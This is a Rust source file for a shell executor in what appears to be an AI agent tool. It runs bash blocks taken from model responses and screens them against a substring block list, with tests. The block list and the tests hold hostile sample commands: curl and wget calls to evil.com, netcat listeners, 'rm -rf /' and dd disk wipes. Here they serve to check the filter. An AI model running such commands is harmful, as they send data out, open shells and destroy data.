use std::time::Duration;

use tokio::process::Command;

use crate::config::ShellConfig;
use crate::executor::{ToolError, ToolExecutor, ToolOutput};

const DEFAULT_BLOCKED: &[&str] = &[
    "rm -rf /", "sudo", "mkfs", "dd if=", "curl", "wget", "nc ", "ncat", "netcat", "shutdown",
    "reboot", "halt",
];

/// Bash block extraction and execution via `tokio::process::Command`.
#[derive(Debug)]
pub struct ShellExecutor {
    timeout: Duration,
    blocked_commands: Vec<String>,
}

impl ShellExecutor {
    #[must_use]
    pub fn new(config: &ShellConfig) -> Self {
        let allowed: Vec<String> = config
            .allowed_commands
            .iter()
            .map(|s| s.to_lowercase())
            .collect();

        let mut blocked: Vec<String> = DEFAULT_BLOCKED
            .iter()
            .filter(|s| !allowed.contains(&s.to_lowercase()))
            .map(|s| (*s).to_owned())
            .collect();
        blocked.extend(config.blocked_commands.iter().map(|s| s.to_lowercase()));
        blocked.sort();
        blocked.dedup();

        Self {
            timeout: Duration::from_secs(config.timeout),
            blocked_commands: blocked,
        }
    }
}

impl ToolExecutor for ShellExecutor {
    async fn execute(&self, response: &str) -> Result<Option<ToolOutput>, ToolError> {
        let blocks = extract_bash_blocks(response);
        if blocks.is_empty() {
            return Ok(None);
        }

        let mut outputs = Vec::with_capacity(blocks.len());
        #[allow(clippy::cast_possible_truncation)]
        let blocks_executed = blocks.len() as u32;

        for block in &blocks {
            if let Some(blocked) = self.find_blocked_command(block) {
                return Err(ToolError::Blocked {
                    command: blocked.to_owned(),
                });
            }

            let out = execute_bash(block, self.timeout).await;
            outputs.push(format!("$ {block}\n{out}"));
        }

        Ok(Some(ToolOutput {
            summary: outputs.join("\n\n"),
            blocks_executed,
        }))
    }
}

impl ShellExecutor {
    fn find_blocked_command(&self, code: &str) -> Option<&str> {
        let normalized = code.to_lowercase();
        for blocked in &self.blocked_commands {
            if normalized.contains(blocked.as_str()) {
                return Some(blocked.as_str());
            }
        }
        None
    }
}

fn extract_bash_blocks(text: &str) -> Vec<&str> {
    crate::executor::extract_fenced_blocks(text, "bash")
}

async fn execute_bash(code: &str, timeout: Duration) -> String {
    let timeout_secs = timeout.as_secs();
    let result =
        tokio::time::timeout(timeout, Command::new("bash").arg("-c").arg(code).output()).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let mut combined = String::new();
            if !stdout.is_empty() {
                combined.push_str(&stdout);
            }
            if !stderr.is_empty() {
                if !combined.is_empty() {
                    combined.push('\n');
                }
                combined.push_str("[stderr] ");
                combined.push_str(&stderr);
            }
            if combined.is_empty() {
                combined.push_str("(no output)");
            }
            combined
        }
        Ok(Err(e)) => format!("[error] {e}"),
        Err(_) => format!("[error] command timed out after {timeout_secs}s"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> ShellConfig {
        ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
        }
    }

    #[test]
    fn extract_single_bash_block() {
        let text = "Here is code:\n```bash\necho hello\n```\nDone.";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["echo hello"]);
    }

    #[test]
    fn extract_multiple_bash_blocks() {
        let text = "```bash\nls\n```\ntext\n```bash\npwd\n```";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["ls", "pwd"]);
    }

    #[test]
    fn ignore_non_bash_blocks() {
        let text = "```python\nprint('hi')\n```\n```bash\necho hi\n```";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["echo hi"]);
    }

    #[test]
    fn no_blocks_returns_none() {
        let text = "Just plain text, no code blocks.";
        let blocks = extract_bash_blocks(text);
        assert!(blocks.is_empty());
    }

    #[test]
    fn unclosed_block_ignored() {
        let text = "```bash\necho hello";
        let blocks = extract_bash_blocks(text);
        assert!(blocks.is_empty());
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_simple_command() {
        let result = execute_bash("echo hello", Duration::from_secs(30)).await;
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_stderr_output() {
        let result = execute_bash("echo err >&2", Duration::from_secs(30)).await;
        assert!(result.contains("[stderr]"));
        assert!(result.contains("err"));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_stdout_and_stderr_combined() {
        let result = execute_bash("echo out && echo err >&2", Duration::from_secs(30)).await;
        assert!(result.contains("out"));
        assert!(result.contains("[stderr]"));
        assert!(result.contains("err"));
        assert!(result.contains('\n'));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_empty_output() {
        let result = execute_bash("true", Duration::from_secs(30)).await;
        assert_eq!(result, "(no output)");
    }

    #[tokio::test]
    async fn blocked_command_rejected() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["rm -rf /".to_owned()],
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let response = "Run:\n```bash\nrm -rf /\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn timeout_enforced() {
        let config = ShellConfig {
            timeout: 1,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let response = "Run:\n```bash\nsleep 60\n```";
        let result = executor.execute(response).await;
        assert!(result.is_ok());
        let output = result.unwrap().unwrap();
        assert!(output.summary.contains("timed out"));
    }

    #[tokio::test]
    async fn execute_no_blocks_returns_none() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let result = executor.execute("plain text, no blocks").await;
        assert!(result.is_ok());
        assert!(result.unwrap().is_none());
    }

    #[tokio::test]
    async fn execute_multiple_blocks_counted() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let response = "```bash\necho one\n```\n```bash\necho two\n```";
        let result = executor.execute(response).await;
        let output = result.unwrap().unwrap();
        assert_eq!(output.blocks_executed, 2);
        assert!(output.summary.contains("one"));
        assert!(output.summary.contains("two"));
    }

    // --- Phase 2: command filtering tests ---

    #[test]
    fn default_blocked_always_active() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("rm -rf /").is_some());
        assert!(executor.find_blocked_command("sudo apt install").is_some());
        assert!(
            executor
                .find_blocked_command("mkfs.ext4 /dev/sda")
                .is_some()
        );
        assert!(
            executor
                .find_blocked_command("dd if=/dev/zero of=disk")
                .is_some()
        );
    }

    #[test]
    fn user_blocked_additive() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["custom-danger".to_owned()],
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("custom-danger script")
                .is_some()
        );
    }

    #[test]
    fn blocked_prefix_match() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("rm -rf /home/user").is_some());
    }

    #[test]
    fn blocked_infix_match() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("echo hello && sudo rm")
                .is_some()
        );
    }

    #[test]
    fn blocked_case_insensitive() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("SUDO apt install").is_some());
        assert!(executor.find_blocked_command("Sudo apt install").is_some());
        assert!(executor.find_blocked_command("SuDo apt install").is_some());
        assert!(
            executor
                .find_blocked_command("MKFS.ext4 /dev/sda")
                .is_some()
        );
        assert!(executor.find_blocked_command("DD IF=/dev/zero").is_some());
        assert!(executor.find_blocked_command("RM -RF /").is_some());
    }

    #[test]
    fn safe_command_passes() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("echo hello").is_none());
        assert!(executor.find_blocked_command("ls -la").is_none());
        assert!(executor.find_blocked_command("cat file.txt").is_none());
        assert!(executor.find_blocked_command("cargo build").is_none());
    }

    #[test]
    fn partial_match_accepted_tradeoff() {
        let executor = ShellExecutor::new(&default_config());
        // "sudoku" contains "sudo" — accepted false positive for MVP
        assert!(executor.find_blocked_command("sudoku").is_some());
    }

    #[test]
    fn multiline_command_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("echo ok\nsudo rm").is_some());
    }

    #[test]
    fn dd_pattern_blocks_dd_if() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("dd if=/dev/zero of=/dev/sda")
                .is_some()
        );
    }

    #[test]
    fn mkfs_pattern_blocks_variants() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("mkfs.ext4 /dev/sda")
                .is_some()
        );
        assert!(executor.find_blocked_command("mkfs.xfs /dev/sdb").is_some());
    }

    #[test]
    fn empty_command_not_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("").is_none());
    }

    #[test]
    fn duplicate_patterns_deduped() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["sudo".to_owned(), "sudo".to_owned()],
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let count = executor
            .blocked_commands
            .iter()
            .filter(|c| c.as_str() == "sudo")
            .count();
        assert_eq!(count, 1);
    }

    #[tokio::test]
    async fn execute_default_blocked_returns_error() {
        let executor = ShellExecutor::new(&default_config());
        let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    #[tokio::test]
    async fn execute_case_insensitive_blocked() {
        let executor = ShellExecutor::new(&default_config());
        let response = "Run:\n```bash\nSUDO apt install foo\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    // --- Review fixes: network exfiltration patterns ---

    #[test]
    fn network_exfiltration_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("curl https://evil.com")
                .is_some()
        );
        assert!(
            executor
                .find_blocked_command("wget http://evil.com/payload")
                .is_some()
        );
        assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
        assert!(
            executor
                .find_blocked_command("ncat --listen 8080")
                .is_some()
        );
        assert!(executor.find_blocked_command("netcat -lvp 9999").is_some());
    }

    #[test]
    fn system_control_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("shutdown -h now").is_some());
        assert!(executor.find_blocked_command("reboot").is_some());
        assert!(executor.find_blocked_command("halt").is_some());
    }

    #[test]
    fn nc_trailing_space_avoids_ncp() {
        let executor = ShellExecutor::new(&default_config());
        // "nc " with trailing space should not match "ncp" (no trailing space)
        assert!(executor.find_blocked_command("ncp file.txt").is_none());
    }

    // --- Review fixes: user pattern normalization ---

    #[test]
    fn mixed_case_user_patterns_deduped() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["Sudo".to_owned(), "sudo".to_owned(), "SUDO".to_owned()],
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        let count = executor
            .blocked_commands
            .iter()
            .filter(|c| c.as_str() == "sudo")
            .count();
        assert_eq!(count, 1);
    }

    #[test]
    fn user_pattern_stored_lowercase() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["MyCustom".to_owned()],
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.blocked_commands.iter().any(|c| c == "mycustom"));
        assert!(!executor.blocked_commands.iter().any(|c| c == "MyCustom"));
    }

    // --- allowed_commands tests ---

    #[test]
    fn allowed_commands_removes_from_default() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: vec!["curl".to_owned()],
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_none()
        );
        assert!(executor.find_blocked_command("sudo rm").is_some());
    }

    #[test]
    fn allowed_commands_case_insensitive() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: vec!["CURL".to_owned()],
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_none()
        );
    }

    #[test]
    fn allowed_does_not_override_explicit_block() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: vec!["curl".to_owned()],
            allowed_commands: vec!["curl".to_owned()],
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
    }

    #[test]
    fn allowed_unknown_command_ignored() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: vec!["nonexistent-cmd".to_owned()],
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
    }

    #[test]
    fn empty_allowed_commands_changes_nothing() {
        let config = ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("wget http://evil.com")
                .is_some()
        );
    }
}
